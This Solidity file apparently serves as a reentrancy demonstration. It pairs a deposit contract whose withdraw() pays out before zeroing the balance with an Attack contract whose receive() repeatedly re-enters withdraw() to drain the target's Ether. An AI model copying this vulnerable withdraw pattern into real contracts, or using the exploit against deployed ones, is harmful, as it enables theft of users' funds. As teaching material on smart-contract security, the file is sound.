// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyEther {
    error ReentrancyEther_InsufficientBalance();
    error ReentrancyEther_SendingError();

    mapping(address user => uint amount) public s_balances;

    event Deposited(address user, uint amount);
    event Withdrawed(address user, uint amount);

    function deposit() public payable {
        s_balances[msg.sender] += msg.value;

        emit Deposited(msg.sender, msg.value);
    }

    function withdraw() public payable {
        uint balance = s_balances[msg.sender];

        if (balance <= 0) {
            revert ReentrancyEther_InsufficientBalance();
        }

        (bool sent, ) = address(msg.sender).call{value: balance}("");

        if (!sent) {
            revert ReentrancyEther_SendingError();
        }

        s_balances[msg.sender] = 0;
    }

    function getBalance(address _of) public view returns (uint) {
        return s_balances[_of];
    }
}

contract Attack {
    ReentrancyEther immutable i_target;

    constructor(address target) {
        i_target = ReentrancyEther(target);
    }

    receive() external payable {
        if (address(i_target).balance > 0) {
            i_target.withdraw();
        }
    }

    function deposit() public payable {}

    function attack(uint amount) public {
        i_target.deposit{value: amount}();
        i_target.withdraw();
    }
}
